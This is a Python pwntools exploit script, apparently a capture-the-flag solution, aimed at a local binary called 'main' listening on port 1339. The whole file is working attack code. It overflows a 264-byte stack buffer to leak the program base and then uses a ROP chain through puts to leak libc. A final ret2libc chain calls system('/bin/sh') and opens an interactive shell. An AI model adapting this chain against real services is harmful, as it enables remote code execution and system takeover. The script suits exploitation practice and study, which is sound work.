from pwn import *
context.arch = 'amd64'

p=remote("127.0.0.1", 1339)
#p = process("./main")
elf = ELF("./main", checksec=False)
libc = elf.libc

p.sendafter(b">> ", b"A" * 264 + b"\x16")

p.recvuntil(b"A" * 264)
elf.address = u64(p.recv(6) + b"\x00\x00") - elf.sym.main - 69
log.info(f"ELF base: {hex(elf.address)}")
rdi = elf.address + 0x0000000000001226

payload = flat(
    b"A" * 264,
    rdi,
    p64(elf.got.puts),
    p64(elf.plt.puts),
    p64(elf.sym.main)
)
p.sendafter(b">> ", payload)
p.recvuntil(b"A" * 264)
p.recv(7)
libc.address = u64(p.recv(6) + b"\x00\x00") - libc.sym.puts
log.info(f"Libc base: {hex(libc.address)}")

rop = ROP(libc)
payload = flat(
    cyclic(264),
    p64(rop.find_gadget(['pop rdi', 'ret'])[0]),
    p64(next(libc.search(b"/bin/sh\x00"))),
    p64(rop.find_gadget(['ret'])[0]),
    p64(libc.sym.system)
)
p.sendafter(b">> ", payload)

p.interactive()